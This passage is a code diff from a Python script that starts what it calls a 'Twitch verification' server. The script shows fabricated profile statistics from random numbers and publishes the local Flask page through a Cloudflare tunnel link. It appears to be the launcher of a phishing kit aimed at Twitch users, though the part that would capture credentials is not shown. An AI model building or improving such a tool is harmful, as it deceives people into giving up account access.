-    print("\n[+] Starting server...")
+    print("\n[+] Starting server on port", port)
     print("[+] Press Ctrl+C to stop.\n")
     
-    # Terminal prompt for user
+    # Informational terminal prompt
     print("="*60)
     print("TERMINAL PROMPT FOR USER")
     print("="*60)
@@ -2765,7 +2635,6 @@ if __name__ == '__main__':
     else:
         print(f"👤 Profile: Default Twitch avatar")
     
-    # Generate appropriate stats
     followers = random.randint(500, 10000) if VERIFICATION_SETTINGS['account_type'] == 'streamer' else random.randint(10, 1000)
     print(f"📊 Stats: {followers} followers • {random.randint(30, 365*3)} days old")
     
@@ -2775,12 +2644,29 @@ if __name__ == '__main__':
     print("="*60)
     print("Open the link below in browser to start verification...\n")
     
-    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port))
+    # Start Flask in a separate thread with reloader disabled
+    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port, debug=False, use_reloader=False, threaded=True))
     flask_thread.daemon = True
     flask_thread.start()
-    time.sleep(1)
-    try:
-        run_cloudflared_and_print_link(port, script_name)
-    except KeyboardInterrupt:
-        print("\n[+] Shutting down Twitch verification server...")
-        sys.exit(0)
+    time.sleep(2)  # Give Flask time to start
+    
+    local_url = f"http://127.0.0.1:{port}"
+    print(f"Local URL: {local_url}")
+    
+    # Try to start cloudflared if available
+    if cloudflared_ok:
+        print("Starting Cloudflare tunnel... (this may take a moment)")
+        try:
+            run_cloudflared_and_print_link(port, script_name)
+        except KeyboardInterrupt:
+            print("\n[+] Shutting down Twitch verification server...")
+            sys.exit(0)
+    else:
+        print("Cloudflare tunnel not available. Use the local URL above.")
+        # Keep the main thread alive
+        try:
+            while True:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            print("\n[+] Shutting down Twitch verification server...")
+            sys.exit(0)
